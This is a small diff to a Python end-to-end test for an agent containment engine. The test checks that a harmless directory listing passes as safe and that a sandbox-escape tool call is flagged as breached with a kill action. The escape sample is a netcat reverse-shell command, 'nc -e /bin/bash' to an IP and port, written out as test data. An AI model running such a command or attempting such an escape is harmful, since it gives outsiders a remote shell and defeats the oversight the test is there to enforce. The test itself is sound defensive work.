@@ -1,6 +1,7 @@
 """End-to-end test for full agent containment intercept flow."""
 
 import uuid
+
 from src.containment.engine import ContainmentEngine
 from src.core.models.events import ToolCallEvent
 
@@ -16,7 +17,7 @@ def test_e2e_escape_containment_lifecycle():
         tool_name="list_directory",
         arguments={"path": "./src"},
     )
-    s1, v1, _ = engine.evaluate_event(evt1)
+    _s1, v1, _ = engine.evaluate_event(evt1)
     assert v1.verdict == "SAFE"
 
     # Step 2: Malicious sandbox escape tool call
@@ -26,7 +27,7 @@ def test_e2e_escape_containment_lifecycle():
         tool_name="exec_shell",
         arguments={"command": "nc -e /bin/bash 192.168.1.100 4444"},
     )
-    s2, v2, sec_events = engine.evaluate_event(evt2)
+    s2, v2, _sec_events = engine.evaluate_event(evt2)
     assert v2.verdict == "BREACHED"
     assert v2.recommended_action == "KILL"
     assert s2.overall_score >= 80.0
